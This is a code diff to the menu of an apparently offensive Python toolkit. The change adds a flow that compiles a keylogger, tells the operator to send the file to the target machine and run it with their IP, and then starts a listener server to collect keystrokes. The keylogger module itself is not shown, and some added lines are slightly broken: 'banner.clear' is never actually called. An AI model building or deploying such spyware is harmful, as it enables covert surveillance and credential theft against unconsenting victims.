@@ -49,6 +49,7 @@ console = Console()
 def main():
     utils.check_sudo()
     while True:
+        
         banner.show_banner()
         choice = main_menu()
 
@@ -86,8 +87,23 @@ def main():
                 banner.show_banner()
                 result =keylogger.getio()
                 if result:
-                    os_type, ip_address, app_name, icon_url = result
-                    keylogger.compile_app(os_type, ip_address, app_name, icon_url)
+                    os_type = result
+                    apppath = keylogger.compile_app(os_type)
+                    if apppath:
+                        banner.clear
+                        banner.show_banner()
+                        appname = os.path.basename(apppath)
+                        console.print(Panel.fit(
+                        f"[bold green]✅ Keylogger compiled successfully![/bold green]\n\n"
+                        f"👉 Output File: {apppath}\n"
+                        f"📤 Send this file to the target machine.\n"
+                        f"💻 Run it using: ./[bold yellow]{appname}[/bold yellow] <your IP>\n",
+                        border_style="magenta"
+                    ))
+                        input("🔙 Press Enter to start listner ...")
+                        banner.clear
+                        banner.show_banner()
+                        keylogger.start_keylogger_server()
                     
                 else:
                     print("❌ User exited.")
